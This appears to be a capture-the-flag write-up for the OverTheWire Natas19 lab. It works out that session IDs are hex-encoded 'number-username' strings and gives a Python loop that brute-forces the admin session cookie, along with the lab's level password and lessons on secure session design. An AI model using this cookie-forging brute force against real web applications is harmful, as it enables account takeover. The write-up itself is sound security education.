---
category: natas
title: Natas19 - Improper Session Management Part 2
---

website: http://natas19.natas.labs.overthewire.org/ (password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs)

Unlike previous challenges, you won't be able to view its source code. However, there is one more line added compared to Natas18:
"This page uses mostly the same code as the previous level, but session IDs are no longer sequential...".
According to the hint, we can guess the implementation in this level would not have many changes except the way how a session ID is generated.

To figure out how a session ID is generated, I double checked the returned PHPSESSID in the cookie by running following curl commands multiple times:

```shell
$ curl -I  -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs "http://natas19.natas.labs.overthewire.org/?username=admin&password=1234"

HTTP/1.1 200 OK
Date: Fri, 23 Apr 2021 17:40:55 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=3336332d61646d696e; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Keep-Alive: timeout=5, max=100
Content-Type: text/html; charset=UTF-8
Via: 1.1 rtp1-dmz-wsa-1.cisco.com:80 (Cisco-WSA/X)
Connection: keep-alive
```

Each time the web application returned a different session ID. However, from what I can tell, the last part is always the same, i.e., "61646d696e", which is the hex ASCII of the username "admin". To validate my guess, I also tried "admin1" as the username. This time the returned PHPSESSID contained "61646d696e31", where it had the hex ASCII of character '1'.

Based on the observation, also taking the hint into consideration, I guess Natas19 generated the session ID in this way:

1. Like what Natas18 did, it first generates a random number between 0 and 640.
2. It then concatenates the random number and the username.
3. Finally it returns the hex ASCII of the concatenated string as the session ID.

To break the password, I came up with the following python script:

```python
for i in range(1, 641):
    sid = f'{i}-admin'
    print(f'Trying PHPSESSID...{sid}', end="\r", flush=True)
    # print(binascii.hexlify(sid.encode()).decode())
    resp = s.post(url, data={"username":'admin', "password":'xxx'}, cookies={'PHPSESSID': binascii.hexlify(sid.encode()).decode()})
    if resp and "Password: " in resp.text:
        print(f'\nPHPSESSID found: {i}')
        print(resp.text)
        break
```

What this script does is to combine a number and the username "admin", then translate the combination into a hex.
Running the script I was able to find the correct session ID and the password for natas20.

<strong>LESSONS LEARNED</strong>

1. One should NOT rely on a cookie to do an authentication work, because cookies can be manipulated.
2. The range for a session ID <em>must</em> be large enough. Otherwise it can be easily brute forced.
3. A session ID <em>must</em> be randomly generated, and <em>should not</em> follow obvious patterns.

In <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">this article</a>,
it gives more details and suggestions about what properties a good session ID must have.

